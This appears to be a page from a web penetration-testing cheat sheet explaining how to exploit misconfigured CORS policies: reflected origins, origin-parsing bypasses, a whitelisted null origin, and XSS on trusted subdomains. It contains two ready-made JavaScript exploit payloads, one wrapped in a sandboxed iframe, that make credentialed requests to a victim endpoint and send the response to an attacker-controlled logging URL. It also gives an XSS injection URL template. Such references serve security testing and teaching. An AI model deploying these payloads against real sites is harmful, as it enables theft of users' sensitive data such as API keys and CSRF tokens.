---
title: "CORS"
weight: 7
description: "Learn how misconfigured CORS policies expose sensitive data via origin reflection, null whitelisting, and XSS on trusted subdomains."
---

# CORS

**Impact**: if a response contains any sensitive information such as an API key or CSRF token, you could retrieve these info.

## Server ACAO Header from Client-Origin

Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.

**Detection**&#x20;

Send request with `Origin: https://example.com` and see if the origin is reflected in the `Access-Control-Allow-Origin` header.

**Exploit**

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://attacker.com/log?key='+this.responseText;
};
</script>
```

## Errors parsing Origin headers

Suppose `normal-website.com`. Bypass with`hackersnormal-website.com` or `normal-website.com.evil-user.net`

{{< hint style=notes >}}
**Note**: you need to know the whitelisted origins.
{{< /hint >}}

## Whitelisted null origin value

**Detection**

Send request with `Origin: null` and see if the response has `Access-Control-Allow-Origin: null`

**Exploit**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://attacker.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Exploiting XSS via CORS trust relationships

Suppose that:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

If you find an XSS on `subdomain.vulnerable-website.com` inject JavaScript that uses CORS and retrieve information.

```sh
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## Cookie SameSite

It is important to note that all this works in according with SameSite cookie attribute. This means that if your session cookie is set with `SameSite=Strict` the browser send the cookie only for same-site requests. For more information about this topic and how to bypass it, refer to [#samesite-cookies](csrf-cross-site-request-forgery.md#samesite-cookies "mention").
